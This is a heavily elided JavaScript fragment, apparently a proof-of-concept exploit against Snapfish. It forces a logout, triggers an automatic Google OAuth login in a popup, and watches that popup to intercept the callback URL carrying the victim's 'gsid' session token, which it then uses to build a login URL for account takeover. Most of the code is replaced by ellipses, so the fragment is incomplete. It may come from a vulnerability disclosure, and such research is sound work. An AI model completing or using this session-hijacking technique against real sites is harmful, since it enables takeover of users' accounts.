(function() {
    ...
    function init() {
        ...
        fetch('https://www.snapfish.com/logout', {
            ...
            // OAuth URL that triggers automatic Google login
            ...
            var checkPopup = setInterval(function() {
                try {
                    ...
                    try {
                        ...
                        // Intercept callback URL containing victim's session token
                        if (popupUrl.includes('/webredirect?gsid=')) {
                            ...
                            var loginUrl = 'https://www.snapfish.com/webredirect?gsid=' + gsid + '&o=connect&user_id=' + userId;
